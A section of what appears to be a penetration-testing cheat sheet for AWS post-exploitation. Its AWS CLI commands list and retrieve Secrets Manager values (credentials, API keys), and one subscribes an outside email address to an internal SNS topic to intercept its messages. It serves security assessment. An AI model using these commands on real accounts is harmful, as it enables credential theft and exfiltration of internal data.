---

---
Enumerate and exploit Secrets Manager, SNS topics, or other services that may leak sensitive data.
### Secrets Manager Enumeration & Exfiltration
---
List All Secrets (if permitted)
```bash
aws secretsmanager list-secrets --region us-east-1
```
Retrieve Secret Values
```bash
aws secretsmanager get-secret-value \
  --secret-id <SecretName> \
  --region us-east-1
```
!!! info "note"
	If a role or user attached to the instance (via IMDS) has `secretsmanager:GetSecretValue`, you can retrieve high-value secrets (API keys, database credentials, etc.).
### Simple Notification Service (SNS) Enumeration
---
**Identify Topic ARNs**
If you’ve discovered an SNS topic ARN (e.g., via Secrets Manager or CloudFormation), subscribe to it to intercept messages (which sometimes contain provisioning or “onboarding” notifications).
```bash
aws sns list-topics --region us-east-1
```
Subscribe to a topic
```bash
aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:<ACCOUNT_ID>:Onboarding_New_Internal_Dev_Msg_01 \
  --protocol email \
  --notification-endpoint you@example.com \
  --region us-east-1
```
